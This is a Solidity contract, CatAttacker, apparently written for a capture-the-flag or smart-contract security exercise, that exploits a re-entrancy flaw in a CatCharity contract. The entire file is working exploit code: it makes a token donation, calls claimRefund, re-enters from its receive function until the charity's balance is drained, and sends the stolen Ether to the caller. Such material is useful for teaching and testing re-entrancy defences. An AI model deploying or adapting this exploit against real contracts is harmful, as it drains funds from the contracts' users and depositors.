// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "./CatCharity.sol";

/**
 * @dev A malicious contract that exploits the re-entrancy in CatCharity.
 */
contract CatAttacker {
    CatCharity public catCharity;

    constructor(address _catCharityAddress) {
        catCharity = CatCharity(_catCharityAddress);
    }

    /**
     * @notice Initiates the re-entrancy attack.
     * @dev We donate a small amount so that we (the Attacker contract)
     *      have a 'donation' recorded, then immediately claim the refund,
     *      re-entering until the charity's entire balance is drained.
     */
    function attack() external payable {
        // Step 1: Donate a tiny bit from this contract
        catCharity.donate{value: msg.value}();

        // Step 2: Start the refund loop
        catCharity.claimRefund();

        // Step 3: Send the money back to player
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // Fallback triggered whenever this contract receives Ether
    receive() external payable {
        // If there's still ETH left in the CatCharity, re-claim
        if (address(catCharity).balance > 0) {
            catCharity.claimRefund();
        }
    }
}
